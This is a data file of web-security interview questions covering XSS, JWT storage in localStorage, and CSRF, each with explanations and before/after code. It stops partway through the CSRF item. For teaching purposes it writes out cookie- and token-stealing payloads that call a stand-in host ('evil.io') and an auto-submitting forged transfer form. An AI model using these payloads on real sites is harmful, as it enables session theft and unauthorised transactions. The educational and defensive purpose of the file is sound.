import type { InterviewQuestion } from '../types';

export const cybersecurityQuestions: InterviewQuestion[] = [
  {
    slug: 'xss-attack-and-defense',
    category: 'cybersecurity',
    topic: 'Web Security',
    title: 'How does XSS work, and how do you defend against it?',
    difficulty: 'beginner',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['xss', 'csp', 'sanitization', 'output-encoding', 'browser-security'],
    oneLiner:
      'The browser cannot tell your code from an attacker payload — every XSS defense is about keeping data out of the HTML parser.',
    whyAsked:
      'XSS is the canonical web security question because it tests whether you understand the browser trust model instead of just memorizing "escape output". Interviewers listen for the taxonomy — stored, reflected, and DOM-based — plus the difference between encoding and sanitization, and whether you treat CSP and HttpOnly as layers or as the fix. Knowing why the browser cannot distinguish app code from injected script is what separates a memorized answer from a real model.',
    mentalModel:
      'An XSS vulnerability is any path where attacker-controlled data reaches an HTML parser or JavaScript interpreter as syntax instead of data. The browser executes whatever it parses in the page origin, so defense means breaking that path everywhere: context-aware output encoding, sanitization only when HTML must survive, and CSP plus HttpOnly as layers that limit damage when a path is missed.',
    steps: [
      {
        title: 'XSS in one minute',
        body: `Cross-site scripting is not a browser bug; it is a trust bug. When a page renders data as markup, any visitor-supplied string can become executable code, and the browser has no way to know that the script it just parsed came from an attacker rather than the application. All script on a page shares one origin, one DOM, and one cookie jar, so injected code runs with exactly the same privileges as first-party code. Watch the animation: the same comment travels through two pipelines. On the left the server concatenates it into HTML and the parser turns the payload into a live image node whose handler fires. On the right the server encodes it, the browser displays angle brackets as text, and no node is ever created. The lesson is blunt: once attacker data reaches an HTML parser unescaped, the browser cannot save you.`,
        code: {
          language: 'javascript',
          source: `// vulnerable: the payload becomes real markup
el.innerHTML = "<p>" + comment + "</p>";

// attacker comment
// <img src=x onerror="fetch('https://evil.io?c=' + document.cookie)">`,
        },
        animation: {
          kind: 'before-after',
          beforeLabel: 'Vulnerable — the payload reaches the HTML parser',
          afterLabel: 'Hardened — output encoded before it reaches the browser',
          before: [
            { text: '// a visitor submits a comment', tone: 'neutral' },
            { text: `res.send('<p>' + comment + '</p>');`, tone: 'danger' },
            { text: `// comment = <img src=x onerror=fetch('https://evil.io?c='+document.cookie)>`, tone: 'danger' },
            { text: '// the HTML parser builds a live <img> node', tone: 'danger' },
            { text: `// onerror fires and the attacker's script runs`, tone: 'danger' },
          ],
          after: [
            { text: '// the same comment arrives', tone: 'neutral' },
            { text: `res.send('<p>' + escapeHtml(comment) + '</p>');`, tone: 'success' },
            { text: '// &lt;img src=x onerror=...&gt;', tone: 'success' },
            { text: '// the parser creates a text node, not markup', tone: 'success' },
            { text: '// no element, no handler, no script execution', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'A comment is submitted and rendered back to the page.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'The server concatenates it into an HTML string — unescaped.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'Generated HTML: raw markup on the left, entity-encoded text on the right.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'The parser interprets the payload as elements — or as literal characters.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'Only the vulnerable pipeline executes attacker code.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'Stored, reflected, DOM-based',
        body: `The taxonomy answers where the payload enters and where it is rendered. Stored XSS saves the payload first — a comment, profile, or support ticket — so every later viewer is attacked and no special link is needed; this is the most dangerous class. Reflected XSS bounces the payload straight back in the response, usually from a query parameter or form field, so the attacker must deliver a crafted link. DOM-based XSS never involves the server at all: client code copies location.hash or another source into a dangerous sink such as innerHTML, so server-side output encoding cannot help. Watch the animation: all three routes converge on the same outcome, attacker-controlled strings becoming executable markup inside a victim origin. The fix differs by class — encode stored and reflected output at render time, and sanitize or avoid dangerous sinks in client code — which is why naming the class is the first real step of any remediation.`,
        animation: {
          kind: 'before-after',
          beforeLabel: 'Three ways in — stored, reflected, DOM-based',
          afterLabel: 'Three places to fix — encode or sanitize',
          before: [
            { text: '// stored: the payload is saved to the database', tone: 'danger' },
            { text: '// reflected: the payload arrives in a URL or form value', tone: 'danger' },
            { text: '// DOM-based: location.hash flows into innerHTML', tone: 'danger' },
            { text: '// stored and reflected pass through the server response', tone: 'neutral' },
            { text: '// DOM-based never touches the server at all', tone: 'neutral' },
          ],
          after: [
            { text: '// stored → encode saved content at render time', tone: 'success' },
            { text: '// reflected → encode the request value on output', tone: 'success' },
            { text: '// DOM-based → use textContent or sanitize client-side', tone: 'success' },
            { text: '// server-side escaping fixes the first two classes', tone: 'success' },
            { text: '// client-side sinks need their own discipline', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'Stored XSS persists and attacks every future viewer.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'Reflected XSS needs a crafted link but leaves no stored trace.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'DOM-based XSS executes entirely in the browser.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'The first two classes are fixed where the response is built.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'The third needs safe client-side sinks.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'The vulnerable sink',
        body: `An HTML sink parses strings as markup. element.innerHTML = userComment is the textbook sink: the assignment is instant, the parser builds real element nodes, and handlers such as onerror fire without any click. document.write, insertAdjacentHTML, eval, and template strings passed to dangerouslySetInnerHTML behave the same way. The animation shows the two assignments side by side. On the left the payload becomes an image node whose broken src triggers onerror, and the handler calls the attacker server; on the right textContent inserts the identical string as text, so the angle brackets are visible characters rather than syntax. When rich formatting must be preserved, never hand the raw string to innerHTML — run it through a maintained allowlist sanitizer such as DOMPurify first. The one-line rule worth saying out loud in an interview: data should stay data.`,
        code: {
          language: 'javascript',
          source: `// vulnerable
element.innerHTML = userComment;

// safe: the payload renders as text
element.textContent = userComment;

// rich text still required? sanitize first
element.innerHTML = DOMPurify.sanitize(userComment);`,
        },
        animation: {
          kind: 'before-after',
          beforeLabel: 'innerHTML — the string is parsed as markup',
          afterLabel: 'textContent / DOMPurify — data stays data',
          before: [
            { text: '// rendering a user comment', tone: 'neutral' },
            { text: 'element.innerHTML = userComment;', tone: 'danger' },
            { text: `// userComment = "<img src=x onerror=steal()>"`, tone: 'danger' },
            { text: '// the HTML parser creates a real <img> node', tone: 'danger' },
            { text: '// the broken image fires onerror: script runs', tone: 'danger' },
          ],
          after: [
            { text: '// rendering the same comment', tone: 'neutral' },
            { text: 'element.textContent = userComment;', tone: 'success' },
            { text: '// angle brackets render as visible characters', tone: 'success' },
            { text: '// rich text still required? sanitize first:', tone: 'neutral' },
            { text: 'element.innerHTML = DOMPurify.sanitize(userComment);', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'A comment is about to be rendered into the page.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'innerHTML parses; textContent inserts.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'The payload contains an element with an event handler.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'On the left the parser builds an element; on the right those characters stay text.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'Sanitization is the only acceptable path back to innerHTML.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'Encode for every context',
        body: `Escaping is context-specific, which is why "just escape it" is incomplete advice. A value placed between tags needs HTML entity encoding; inside an attribute it also needs quote encoding; inside a URL it needs percent encoding; and inside a script block it needs a serializer designed for script contexts. JSON.stringify alone is unsafe there: it does not escape <, so a payload containing </script> can break out of the block, and server-rendered script data must escape <, >, and & (or use a serializer built for script contexts). Modern template engines escape automatically for HTML contexts, but they cannot follow a value into a URL or an inline event handler. The animation contrasts string-built HTML — where one bio value is safe in one context and breaks the next — with template interpolation that applies the right encoder per slot. The practical rules are short: never concatenate HTML by hand, let the template engine escape, percent-encode dynamic URL components, and render script data through a serializer that escapes <, >, and & rather than raw JSON.stringify.`,
        code: {
          language: 'javascript',
          source: `// choose the encoder for the destination context
const safeText = escapeHtml(bio);            // HTML body
const safeAttr = escapeHtml(quote(bio));     // attribute value
const safeUrl = encodeURIComponent(bio);     // URL component
const safeJson = JSON.stringify(bio);        // NOT safe alone in <script>: escape <, >, &`,
        },
        animation: {
          kind: 'before-after',
          beforeLabel: 'String-built HTML — one encoder cannot cover every context',
          afterLabel: 'Context-aware templates — each slot gets the right encoder',
          before: [
            { text: '// one value used in four output contexts', tone: 'neutral' },
            { text: '<p>${bio}</p> — HTML body: tags parse', tone: 'danger' },
            { text: '<a title="${bio}"> — attribute: quote breakout', tone: 'danger' },
            { text: '<a href="/u?next=${bio}"> — URL: javascript: scheme', tone: 'danger' },
            { text: '// concatenated HTML bypasses every auto-escape', tone: 'danger' },
          ],
          after: [
            { text: '// the template engine escapes per context', tone: 'neutral' },
            { text: '<p><%= bio %></p>', tone: 'success' },
            { text: '<a title="<%= bio %>">', tone: 'success' },
            { text: '<a href="/u?next=<%= encodeURIComponent(bio) %>">', tone: 'success' },
            { text: '// never concatenate HTML: pass data into templates', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'One untrusted value, four places it can land.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'In an HTML body, unescaped tags become elements.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'In an attribute, a quote breaks out of the value.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'In a URL, an unencoded scheme becomes executable.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'Templates encode per slot; concatenation cannot.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'CSP and HttpOnly limits',
        body: `Defense in depth assumes a bug will slip through. A Content-Security-Policy such as script-src 'self' 'nonce-...' tells the browser to refuse inline and third-party scripts, so a markup injection that produces a blockable script simply does not execute — though the policy must be strict, because unsafe-inline or broad host allowlists defeat it. Trusted Types can additionally force code through a sanitizer before it reaches a dangerous sink. HttpOnly is a different, narrower control: it stops JavaScript from reading a cookie, so an XSS payload cannot silently exfiltrate the session token. It does not stop the XSS itself — the malicious script still runs inside the page and can issue authenticated requests as the user. Watch the animation: CSP blocks the injected script, and even if it ran, document.cookie is empty. Use both, and keep sessions short.`,
        animation: {
          kind: 'before-after',
          beforeLabel: 'No policy — injected script runs and reads the cookie',
          afterLabel: 'CSP + HttpOnly — blocked script, unreadable cookie',
          before: [
            { text: '// no Content-Security-Policy header', tone: 'danger' },
            { text: '// any injected inline <script> executes', tone: 'danger' },
            { text: `fetch('https://evil.io?c=' + document.cookie);`, tone: 'danger' },
            { text: '// session=abc123 leaves the browser', tone: 'danger' },
            { text: '// the stolen session is reusable until expiry', tone: 'danger' },
          ],
          after: [
            { text: `Content-Security-Policy: script-src 'self' 'nonce-r4nd0m';`, tone: 'success' },
            { text: '// injected inline <script> is refused by the browser', tone: 'success' },
            { text: 'Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax', tone: 'success' },
            { text: `document.cookie // '' — JavaScript sees nothing`, tone: 'success' },
            { text: '// XSS can still act, but cannot steal the token', tone: 'neutral' },
          ],
          frames: [
            { id: 'f1', caption: 'Without a policy, every injected script is allowed.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'A strict CSP refuses inline execution.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'HttpOnly takes the session cookie out of JavaScript reach.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'The exfiltration call has nothing to read.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'CSP limits execution; HttpOnly limits theft — neither alone is enough.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
    ],
    edgeCases: [
      'Sanitizing on input and trusting it forever: stored payloads outlive code, and library fixes change what is dangerous — encode or sanitize again on output.',
      'Blocklisting tags or stripping <script> by hand: mutation XSS slips through naive filters — use a maintained allowlist sanitizer such as DOMPurify.',
      "CSP containing 'unsafe-inline': it re-enables exactly the inline execution you were trying to block — prefer nonces or hashes and drop unsafe sources.",
      'Trusting HttpOnly to stop XSS: the payload still runs and can act as the user — HttpOnly only prevents reading the cookie, so keep the injected script out too.',
      'Forgetting DOM-based sources: location.hash, window.name, and postMessage data flowing into innerHTML are invisible to server-side encoding.',
    ],
    followUps: [
      {
        q: 'What is the difference between output encoding and sanitization?',
        a: 'Encoding converts dangerous characters into inert text for a specific context — always safe, but it destroys markup. Sanitization parses untrusted HTML and removes dangerous parts so safe formatting survives; it is riskier and must use a maintained library.',
      },
      {
        q: 'Why is CSP called defense in depth rather than a fix?',
        a: 'A strict CSP blocks many injected executions, but it must be configured correctly and some payloads work through allowed origins or style tricks. It limits exploitation; it does not remove the injection path.',
      },
      {
        q: 'Does HttpOnly stop XSS?',
        a: 'No. The script still executes in your origin. HttpOnly only stops it from reading cookies, so it limits session-token theft but not actions performed as the user.',
      },
    ],
    relatedEngine: { label: 'Explore the Web Security visualizer', href: '/fullstack/websecurity' },
  },
  {
    slug: 'jwt-localstorage-risk',
    category: 'cybersecurity',
    topic: 'Authentication',
    title: 'Why is storing JWTs in localStorage dangerous?',
    difficulty: 'intermediate',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['jwt', 'localstorage', 'httponly', 'cookies', 'token-rotation'],
    oneLiner:
      'A JWT is a bearer token: one XSS payload that reads localStorage silently walks away with an account that stays valid until expiry.',
    whyAsked:
      'Token storage is where authentication design meets XSS, and interviewers use it to see whether you understand JWTs as bearer credentials rather than magic strings. The strongest answers separate what the token is (signed claims), what it represents (possession equals identity), and where it lives (JavaScript-readable storage versus HttpOnly cookies), then name the trade-off each choice creates. The question also opens the door to refresh rotation and revocation, which is where senior candidates stand out.',
    mentalModel:
      'A JWT is a signed, base64url-encoded claim set and a bearer credential: whoever holds the string is treated as the user. localStorage is readable by every script on the origin, so any XSS turns a stored token into silent, valid-until-expiry account takeover. HttpOnly cookies move the credential out of JavaScript reach and have the browser attach it automatically, trading XSS exfiltration for CSRF exposure that SameSite and CSRF tokens must then handle.',
    steps: [
      {
        title: 'Three parts, no secrets',
        body: `A JWT is three base64url segments joined by dots: a header describing the algorithm, a claims payload, and a signature. Base64url is reversible encoding, not encryption, which is the first misconception this question tests. Anyone holding the token can decode the payload and read every claim — user id, role, expiry — and the animation shows exactly that, with the decoded object appearing beside the raw string. What the signature actually buys is integrity: it proves the server issued these claims and that nobody altered them, because forging a valid signature without the key is infeasible — provided the verifier pins the expected algorithm and rejects none; naive verification that trusts the token's own alg header falls to alg-confusion or unsigned-token attacks. It does not encrypt the payload and it does not identify the current holder. The distinction to say out loud in an interview is "signed, not secret" — then explain what that means for storage and trust.`,
        code: {
          language: 'javascript',
          source: `// raw token: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1XzQ4MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2MDAwMDAwMH0.9xQ...

// decoded payload (anyone can do this)
JSON.parse(atob('eyJzdWIiOiJ1XzQ4MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2MDAwMDAwMH0'))
// { "sub": "u_482", "role": "admin", "exp": 1760000000 }`,
        },
        animation: {
          kind: 'before-after',
          beforeLabel: 'Assumed — a token that proves who you are',
          afterLabel: 'Reality — signed claims, readable by anyone',
          before: [
            { text: '// "base64 must be some kind of encryption"', tone: 'danger' },
            { text: '// "only the server can read my claims"', tone: 'danger' },
            { text: '// "the token itself proves it is really me"', tone: 'danger' },
            { text: '// "nobody else could be holding this string"', tone: 'danger' },
            { text: '// "so storage almost does not matter"', tone: 'danger' },
          ],
          after: [
            { text: '// base64url is reversible encoding, not encryption', tone: 'success' },
            { text: '{ "sub": "u_482", "role": "admin", "exp": 1760000000 }', tone: 'success' },
            { text: '// the signature proves integrity and origin only', tone: 'success' },
            { text: '// it authenticates whoever presents it', tone: 'success' },
            { text: '// treat the token as a bearer credential, not a profile', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'Assumed: the token is opaque and encrypted.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'Reality: the payload decodes to plain JSON claims.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'The signature checks integrity, not secrecy.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'Any holder of the string is the user as far as the server knows.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'So where the token lives decides the blast radius.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'A bearer token is a key',
        body: `The word bearer is literal: whoever bears the token gets the access. The server validates the signature and the expiry claim, then trusts the identity inside — it has no way to know whether the request came from the human who logged in or from someone who copied the string. There is no device binding and no session identifier the server can revoke unless you built one. The animation walks through this asymmetry: a thief who obtains the token replays one request and the server treats it as a perfectly valid session, because cryptographically it is one. Two consequences follow. First, guard the token with the same care as a password, especially against XSS. Second, if you need revocation, add server-side state such as a token id denylist or short expiries with rotation, because a stateless JWT cannot be un-issued.`,
        animation: {
          kind: 'before-after',
          beforeLabel: 'Bearer semantics — the server only checks the signature',
          afterLabel: 'Hardening — state that makes theft visible',
          before: [
            { text: 'Authorization: Bearer eyJhbGciOi...', tone: 'neutral' },
            { text: '// signature valid, exp valid → request authorized', tone: 'danger' },
            { text: '// no device binding, no session record', tone: 'danger' },
            { text: '// victim and thief are indistinguishable', tone: 'danger' },
            { text: '// a stolen token keeps working until exp', tone: 'danger' },
          ],
          after: [
            { text: '// add a server-side session or jti record', tone: 'success' },
            { text: '// short exp: minutes, not days', tone: 'success' },
            { text: '// rotation: refresh tokens are one-time', tone: 'success' },
            { text: '// reuse detection revokes the token family', tone: 'success' },
            { text: '// logout can finally invalidate server-side state', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'The token travels in the Authorization header.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'Signature and expiry pass — nothing else is checked.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'Stateless verification leaves no record to revoke.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'A replay is cryptographically identical to the real user.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'State and short lifetimes make theft detectable.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'localStorage versus HttpOnly cookies',
        body: `This is the heart of the question. localStorage is readable by any JavaScript running on the origin, including a payload planted by a single XSS flaw anywhere on the site. The animation's left pipeline shows the theft end to end: the app stores the access token with localStorage.setItem, an injected script calls getItem, and one outbound fetch sends it to the attacker — no user interaction, no visible trace, and the token remains valid until exp. The right pipeline uses an HttpOnly, Secure, SameSite cookie: the browser stores the credential outside the JavaScript-accessible cookie API, attaches it automatically on requests to the origin, and document.cookie returns an empty string. XSS can still act through the victim's browser, but it cannot walk away with a long-lived credential. That is the trade the next step expands on.`,
        code: {
          language: 'javascript',
          source: `// localStorage: readable by ANY script on the origin
localStorage.setItem('access_token', token);
const stolen = localStorage.getItem('access_token'); // XSS does this

// HttpOnly cookie: out of JavaScript reach
// Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax
document.cookie; // '' — the token is not here`,
        },
        animation: {
          kind: 'before-after',
          beforeLabel: 'localStorage — any script on the origin can read it',
          afterLabel: 'HttpOnly cookie — the browser attaches it, JS cannot read it',
          before: [
            { text: `localStorage.setItem('access', token);`, tone: 'danger' },
            { text: '// months later, one XSS payload runs', tone: 'danger' },
            { text: `const t = localStorage.getItem('access');`, tone: 'danger' },
            { text: `fetch('https://evil.io?t=' + t);`, tone: 'danger' },
            { text: '// silent, valid until exp: full account takeover', tone: 'danger' },
          ],
          after: [
            { text: 'Set-Cookie: access=...; HttpOnly; Secure; SameSite=Lax', tone: 'success' },
            { text: '// the same XSS payload still runs', tone: 'neutral' },
            { text: `document.cookie // '' — nothing to read`, tone: 'success' },
            { text: '// the browser attaches the cookie automatically', tone: 'success' },
            { text: '// theft is blocked; CSRF becomes the trade-off', tone: 'neutral' },
          ],
          frames: [
            { id: 'f1', caption: 'The app decides where the credential lives.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'One XSS flaw anywhere on the origin is enough.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'JavaScript reads localStorage and cannot read HttpOnly.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'One fetch exfiltrates the token; the cookie never surfaces.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'HttpOnly trades token theft for CSRF handling.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'Cookies trade XSS for CSRF',
        body: `Moving a token from localStorage into a cookie fixes exfiltration by JavaScript but reintroduces a classic problem: browsers attach cookies automatically based on destination, so another site can cause the victim browser to send authenticated requests. That is CSRF. The mitigation set is well understood — mark cookies Secure so they never travel over plain HTTP, set SameSite=Lax or Strict so cross-site requests do not carry them, and validate an anti-CSRF token on state-changing endpoints. The animation shows the trade directly. On the left, script reads a localStorage token and exfiltrates it; on the right, the cookie never appears in JavaScript, but the browser will volunteer it to bank.com from any tab, which is the exposure you now own. Prefer cookies plus CSRF defenses; the alternative keeps long-lived tokens exactly where a single XSS can steal them.`,
        animation: {
          kind: 'before-after',
          beforeLabel: 'Cookie flow — automatic attachment invites CSRF',
          afterLabel: 'Cookie + CSRF defenses — intent is required',
          before: [
            { text: '// the cookie is not readable by JavaScript', tone: 'neutral' },
            { text: '// but the browser attaches it by destination', tone: 'danger' },
            { text: '// evil.com triggers a POST to bank.com', tone: 'danger' },
            { text: `// the bank sees the victim's cookie and acts`, tone: 'danger' },
            { text: '// automatic credentials are the CSRF surface', tone: 'danger' },
          ],
          after: [
            { text: 'Set-Cookie: ...; Secure; SameSite=Lax', tone: 'success' },
            { text: '// cross-site POSTs no longer carry the cookie', tone: 'success' },
            { text: '// state-changing routes require a CSRF token', tone: 'success' },
            { text: '// the token must be unreadable cross-origin', tone: 'success' },
            { text: '// XSS exposure is fixed; CSRF is managed', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'HttpOnly solves theft but leaves attachment automatic.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'The browser decides which cookies ride along.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'A cross-site page can trigger the request.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'The server cannot tell forged from intended.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'SameSite plus tokens restore intent checking.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
      {
        title: 'Short-lived tokens, rotating refresh',
        body: `No storage choice removes the need to limit damage. Long-lived access tokens are the worst case: a stolen token stays valuable until its exp, which may be days away. The standard pattern pairs a short-lived access token — roughly five to fifteen minutes — with a refresh token stored in an HttpOnly cookie. When the access token expires, the client calls the refresh endpoint for a new one. Rotation means each refresh issues a new refresh token and invalidates the old one; if an old token is presented twice, the server treats it as theft and revokes the whole session family. The animation contrasts a single month-long token that keeps working after theft with a rotating pair that turns the same theft into a short window and a detectable event. Add a jti denylist or a token version claim when you need immediate revocation on logout.`,
        animation: {
          kind: 'before-after',
          beforeLabel: 'One long-lived token — theft stays valid for weeks',
          afterLabel: 'Short access + rotating refresh — theft is bounded',
          before: [
            { text: '// access token with exp = 30 days', tone: 'danger' },
            { text: '// stolen once, replayed from anywhere', tone: 'danger' },
            { text: '// no revocation without server-side state', tone: 'danger' },
            { text: '// the token keeps working after logout', tone: 'danger' },
            { text: '// blast radius: the whole account, for weeks', tone: 'danger' },
          ],
          after: [
            { text: '// access token expires in 10-15 minutes', tone: 'success' },
            { text: '// refresh token lives in an HttpOnly cookie', tone: 'success' },
            { text: '// every refresh rotates the token', tone: 'success' },
            { text: '// a replayed old refresh token is detected', tone: 'success' },
            { text: '// theft revokes the session family immediately', tone: 'success' },
          ],
          frames: [
            { id: 'f1', caption: 'Long expiry means long exploitation windows.', beforeIndex: 0, afterIndex: 0 },
            { id: 'f2', caption: 'A stolen bearer token works from anywhere.', beforeIndex: 1, afterIndex: 1 },
            { id: 'f3', caption: 'Rotation makes each credential single-use.', beforeIndex: 2, afterIndex: 2 },
            { id: 'f4', caption: 'Replay of an old refresh token signals theft.', beforeIndex: 3, afterIndex: 3 },
            { id: 'f5', caption: 'Short access tokens turn theft into a small, visible window.', beforeIndex: 4, afterIndex: 4 },
          ],
        },
      },
    ],
    edgeCases: [
      'Keeping tokens in memory only: it reduces XSS exposure but loses sessions on refresh — pair it with an HttpOnly refresh cookie or accept re-login.',
      "Using sessionStorage as a safer localStorage: any script on the origin still reads it for the tab's lifetime, so XSS exfiltrates just as easily.",
      'Long-lived access tokens in cookies: HttpOnly stops JavaScript theft, but a leaked cookie stays valid for its full lifetime — keep exp short and rotate.',
      'Refresh rotation without reuse detection: a stolen refresh token can be used forever — detect replay and revoke the entire token family.',
      'Stateless JWTs with no revocation path: logout and password changes cannot un-issue them — add a jti denylist, a token version claim, or both.',
    ],
    followUps: [
      {
        q: 'Is localStorage safe if the app has no XSS?',
        a: 'That is a fragile assumption. One injected dependency, one templating bug, or one third-party script changes the answer, so storage should be defense in depth rather than the primary control.',
      },
      {
        q: 'Cookies or localStorage — which should you choose?',
        a: 'Prefer HttpOnly, Secure, SameSite cookies for credentials and handle the CSRF trade-off with tokens or SameSite=Lax. Use localStorage only for non-credential UI state.',
      },
      {
        q: 'How do you revoke a JWT?',
        a: 'Stateless JWTs cannot be revoked on their own. Use short expiries with refresh rotation and reuse detection, or add server-side state such as a jti denylist or token version.',
      },
    ],
    relatedEngine: { label: 'Explore the Auth visualizer', href: '/fullstack/authviz' },
  },
  {
    slug: 'csrf-how-and-samesite',
    category: 'cybersecurity',
    topic: 'Web Security',
    title: 'How does CSRF work when the attacker cannot read cookies?',
    difficulty: 'intermediate',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['csrf', 'samesite', 'cookies', 'csrf-tokens', 'same-origin-policy'],
    oneLiner:
      'The attacker never reads the cookie — the browser volunteers it because cookies follow the destination, not the page that sent you there.',
    whyAsked:
      'CSRF separates people who understand the browser credential model from people who repeat "use a CSRF token". Interviewers probe why the attacker never needs to read the cookie, why the same-origin policy does not help, and whether you know that POST-only APIs and default-Lax cookies change the risk surface without eliminating it. The best answers connect browser policy, server validation, and API design into one story.',
    mentalModel:
      'The browser chooses which cookies to attach by looking at the request destination, not at the page that initiated it. So evil.com can make the victim browser send an authenticated request to bank.com while never reading the cookie or the response. Defenses either stop the browser from attaching credentials (SameSite) or make the server verify intent independently of ambient cookies (CSRF tokens, Origin checks) — and state-changing GET endpoints break both stories.',
    steps: [
      {
        title: 'Cookies travel by destination',
        body: `Cookies are not attached by the page that initiates a request; they are attached by the browser according to the request destination origin. That single fact is the foundation of CSRF. When the victim is logged into bank.com, the session cookie lives in the browser cookie store. Any page, including evil.com, can cause the browser to submit a form, load an image, or fire a no-cors fetch whose destination is bank.com, and the browser will attach the bank cookie because the destination matches. The attacker never sees that cookie and does not need to. The animation follows the request: the evil site triggers a transfer POST, the browser reaches into the cookie store, attaches the session cookie, and the bank server processes the request as the logged-in user. The response is unreadable cross-origin, but the money already moved.`,
        animation: {
          kind: 'step-flow',
          nodes: [
            { id: 'victim', label: 'Victim Browser' },
            { id: 'evil', label: 'Evil Site' },
            { id: 'bank', label: 'Bank Server' },
            { id: 'cookies', label: 'Cookie Store', sublabel: 'bank.com session' },
          ],
          phases: [
            { id: 'p1', caption: 'The victim logs into bank.com and receives a session cookie.', packets: [{ from: 'bank', to: 'cookies', label: 'Set-Cookie' }], activeNodeIds: ['victim', 'bank'] },
            { id: 'p2', caption: 'The browser files the cookie under bank.com; other origins cannot read it.', doneNodeIds: ['bank'], activeNodeIds: ['cookies'] },
            { id: 'p3', caption: 'The victim opens evil.com, which loads a hidden form aimed at bank.com/transfer.', packets: [{ from: 'victim', to: 'evil', label: 'opens page' }], activeNodeIds: ['evil'] },
            { id: 'p4', caption: 'The browser submits it and attaches the bank.com cookie because the destination is bank.com.', packets: [{ from: 'evil', to: 'victim', label: 'auto-submit' }, { from: 'cookies', to: 'bank', label: 'session=...' }], doneNodeIds: ['evil'], activeNodeIds: ['victim', 'bank'] },
            { id: 'p5', caption: 'The bank sees a valid session and executes the transfer as the logged-in user.', doneNodeIds: ['victim'], activeNodeIds: ['bank'] },
            { id: 'p6', caption: 'The attacker cannot read the response — but the transfer already happened.', doneNodeIds: ['victim', 'evil', 'bank', 'cookies'] },
          ],
        },
      },
      {
        title: 'Riding, not stealing',
        body: `Candidates often assume CSRF requires stealing a session token, so they answer with HTTPS or token storage and miss the point. CSRF never reads the cookie: the attacker page only causes the browser to send it, and the side effect on the server is the payload. That is why the same-origin policy does not save you — it blocks reading responses, not sending requests. The animation shows this explicitly: on the forged request the cookie store hands the session cookie to the browser, which forwards it to the bank, while the evil site learns nothing back. Mechanisms that trigger a credentialed cross-site request include auto-submitted forms, image and link tags, and fetch with mode no-cors. Because the response body is irrelevant, blocking script access changes nothing. The defense must live either in the browser cookie policy or in server-side request validation.`,
        code: {
          language: 'html',
          source: `<!-- evil.com: no script needed, no cookie access needed -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('f').submit();</script>`,
        },
        animation: {
          kind: 'step-flow',
          nodes: [
            { id: 'victim', label: 'Victim Browser' },
            { id: 'evil', label: 'Evil Site' },
            { id: 'bank', label: 'Bank Server' },
            { id: 'cookies', label: 'Cookie Store', sublabel: 'bank.com session' },
